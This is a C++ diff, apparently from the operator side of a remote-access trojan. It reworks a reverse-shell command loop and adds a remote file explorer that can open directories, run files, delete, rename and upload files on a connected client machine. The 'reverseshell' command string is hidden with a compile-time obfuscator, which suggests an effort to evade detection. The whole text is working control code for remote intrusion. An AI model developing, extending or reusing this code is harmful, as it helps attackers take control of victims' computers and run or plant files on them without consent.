@@ -75,6 +75,15 @@ void StampaHelp(string Cmd, string Desc)
     cout << endl;
 }
 
+void StampaIncompatibile()
+{
+    TextColor tc;
+
+    tc.SetColor(tc.Red);
+    cout << "Questo comando non e' compatibile con il Client.\nAggiorna il Client con uno piu' recente tramite il comando \"Update\"." << endl;
+    tc.SetColor(tc.Default);
+}
+
 void DrunkeranEgg()
 {
     TextColor tc;
@@ -550,11 +559,11 @@ bool ReverseShell(SOCKET Sock)
 	
     cout << endl;
 
-    if (COMUNICAZIONI::ReverseShell(Sock, (string)AY_OBFUSCATE("reverseshell")) == "OK")
+    if (COMUNICAZIONI::PingPong(Sock, (string)AY_OBFUSCATE("reverseshell")) == "OK")
     {
         while (true)
         {
-            Path = COMUNICAZIONI::ReverseShell(Sock, "Get cd");
+            Path = COMUNICAZIONI::PingPong(Sock, "Get cd");
 
             if (Path == "")
                 return false;
@@ -578,7 +587,7 @@ bool ReverseShell(SOCKET Sock)
             }
             else
             {
-                Res = COMUNICAZIONI::ReverseShell(Sock, Cmd);
+                Res = COMUNICAZIONI::PingPong(Sock, Cmd);
 
                 if (Res == "")
                     return false;
@@ -596,14 +605,297 @@ bool ReverseShell(SOCKET Sock)
     return false;
 }
 
-bool FileExplorer(SOCKET Sock)
+short FileExplorer(SOCKET Sock)
 {
     CliFileExplorer cfe;
+    ConsoleUtils cu;
+    TextColor tc;
+    CLInterface cli;
+    DirUtils du;
+    string Res = "";
+    json j;
 
-    cfe.PrintLayout();
-    system("pause");
+    /*while (true)
+        cout << _getch() << endl;*/
 
-    return false;
+    if (!cfe.PrintLayout())
+    {
+        cout << "Dimensioni della finestra insufficienti, ingrandisci la finestra e riprova." << endl;
+        return 1;
+    }
+
+    Res = COMUNICAZIONI::PingPong(Sock, "fileexplorer");
+
+    if (Res == "")
+        return 2;
+
+    cfe.FilesParse(json::parse(Res));
+    cfe.UpdateContent();
+
+    for (bool b = true; b;)
+    {
+        cu.SetCursorVisible(false);
+
+        switch (_getch())
+        {
+            case 72: // UP
+            {
+                cfe.UpdateSelection(false);
+                cfe.UpdateContent();
+                break;
+            }
+
+            case 80: // DOWN
+            {
+                cfe.UpdateSelection(true);
+                cfe.UpdateContent();
+                break;
+            }
+
+            case 27: // ESC
+            {
+                j.clear();
+
+                j["Action"] = "Exit";
+                TcpIP::SendString(Sock, j.dump());
+                b = false;
+                break;
+            }
+
+            case 13: // ENTER
+            {
+                j.clear();
+
+                if (!cfe.CurrSelectionInfo().Type) // Directory
+                {
+                    j["Action"] = "OpenDir";
+                    j["Path"] = cfe.CurrSelectionInfo().FullPath;
+
+                    cout << "Loading ";
+                    cli.OneCharBar();
+
+                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+
+                    cli.StopBar();
+
+                    if (Res == "")
+                        return 2;
+                    else if (Res != "denied")
+                    {
+                        cfe.FilesParse(json::parse(Res));
+                        cfe.ResetSelection();
+                        cfe.UpdateContent();
+                    }
+                    else
+                    {
+                        cfe.UpdateContent();
+                        tc.SetColor(tc.Red);
+                        cout << "Access denied.";
+                        tc.SetColor(tc.Default);
+                    }
+                }
+                else // File
+                {
+                    j["Action"] = "RunFile";
+                    j["Path"] = cfe.CurrSelectionInfo().FullPath;
+
+                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+
+                    if (Res == "")
+                        return 2;
+                    else
+                    {
+                        cfe.FilesParse(json::parse(Res));
+                        cfe.UpdateContent();
+                    }
+                }
+                break;
+            }
+
+            case 8: // BACKSPACE
+            {
+                j.clear();
+
+                j["Action"] = "GoUp";
+
+                cout << "Loading ";
+                cli.OneCharBar();
+
+                Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+
+                cli.StopBar();
+
+                if (Res == "")
+                    return 2;
+                else if (Res != "denied")
+                {
+                    cfe.FilesParse(json::parse(Res));
+                    cfe.ResetSelection();
+                    cfe.UpdateContent();
+                }
+                else
+                {
+                    cfe.UpdateContent();
+                    tc.SetColor(tc.Red);
+                    cout << "Access denied.";
+                    tc.SetColor(tc.Default);
+                }
+                break;
+            }
+
+            case 83: // DEL
+            {
+                j.clear();
+
+                j["Action"] = "Delete";
+                j["Path"] = cfe.CurrSelectionInfo().FullPath;
+                j["Type"] = cfe.CurrSelectionInfo().Type;
+
+                cout << "Loading ";
+                cli.OneCharBar();
+
+                Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+
+                cli.StopBar();
+
+                if (Res == "")
+                    return 2;
+                else if (Res != "denied")
+                {
+                    cfe.FilesParse(json::parse(Res));
+                    cfe.UpdateContent();
+                }
+                else
+                {
+                    cfe.UpdateContent();
+                    tc.SetColor(tc.Red);
+                    cout << "Permission denied.";
+                    tc.SetColor(tc.Default);
+                }
+                break;
+            }
+
+            case 63: // F5
+            {
+                j.clear();
+
+                j["Action"] = "Refresh";
+
+                cout << "Loading ";
+                cli.OneCharBar();
+
+                Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+
+                cli.StopBar();
+
+                if (Res == "")
+                    return 2;
+                
+                cfe.FilesParse(json::parse(Res));
+                cfe.UpdateContent();
+
+                break;
+            }
+
+            case 114: // R
+            {
+                string NewName;
+
+                cu.SetCursorVisible(true);
+                cout << "NewName: ";
+                getline(cin, NewName);
+                cfe.RealignVisual();
+
+                if (NewName == "")
+                    break;
+
+                j.clear();
+
+                j["Action"] = "Rename";
+                j["OldName"] = cfe.CurrSelectionInfo().FullPath;
+                j["NewName"] = cfe.CurrSelectionInfo().Path + NewName;
+
+                Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+
+                if (Res == "")
+                    return 2;
+                else if (Res != "denied")
+                {
+                    cfe.FilesParse(json::parse(Res));
+                    cfe.UpdateContent();
+                }
+                else
+                {
+                    cfe.UpdateContent();
+                    tc.SetColor(tc.Red);
+                    cout << "Permission denied.";
+                    tc.SetColor(tc.Default);
+                }
+                break;
+            }
+
+            case 117: // U
+            {
+                string LocalFile = du.ChoseFileDialog();
+                string FileName;
+
+                if (LocalFile == "")
+                    break;
+
+                FileName = cfe.CurrSelectionInfo().Path + LocalFile.substr(LocalFile.find_last_of("\\") + 1);
+
+                j.clear();
+                j["Action"] = "Upload";
+
+                if (!TcpIP::SendString(Sock, j.dump()))
+                    return 2;
+
+                cout << "Uploading... ";
+
+                if (!COMUNICAZIONI::UploadFileWithLoading(Sock, FileName, du.GetBinaryFileContent(LocalFile), cfe.HelpSize))
+                {
+                    cfe.RealignVisual();
+                    return 2;
+                }
+                cfe.RealignVisual();
+
+                if (!TcpIP::RecvString(Sock, Res))
+                    return 2;
+
+                if (Res == "OK")
+                {
+                    j.clear();
+                    j["Action"] = "Refresh";
+
+                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+
+                    if (Res == "")
+                        return 2;
+
+                    cfe.FilesParse(json::parse(Res));
+                    cfe.UpdateContent();
+                }
+                else if (Res == "denied")
+                {
+                    cfe.UpdateContent();
+                    tc.SetColor(tc.Red);
+                    cout << "Permission denied.";
+                    tc.SetColor(tc.Default);
+                    break;
+                }
+                else
+                    return 2;
+
+                break;
+            }
+
+            default:
+                break;
+        }
+    }
+
+    cu.SetCursorVisible(true);
+    return 0;
 }
 
 void Sessione(int ID, SOCKET Sock)
@@ -736,14 +1028,30 @@ void Sessione(int ID, SOCKET Sock)
         }
         else if (cmd == "filexplorer" || cmd == "explorer")
         {
-            bool tmp = FileExplorer(Sock);
+            if (Clients[ID].info.CompatibleVer < 1)
+                StampaIncompatibile();
+            else
+            {
+                switch (FileExplorer(Sock))
+                {
+                    case 0:
+                        system("cls");
+                        StampaTitolo(1);
+                        cli.SubTitle("Sessione Comandi", 60, tc.Green);
+                        break;
 
-            system("cls");
-            StampaTitolo(1);
-            cli.SubTitle("Sessione Comandi", 60, tc.Green);
+                    case 1:
+                        break;
 
-            if (!tmp)
-                Controllo = CheckConnection(Sock, ID);
+                    case 2:
+                        system("cls");
+                        StampaTitolo(1);
+                        cli.SubTitle("Sessione Comandi", 60, tc.Green);
+
+                        Controllo = CheckConnection(Sock, ID);
+                        break;
+                }
+            }
         }
         else
         {
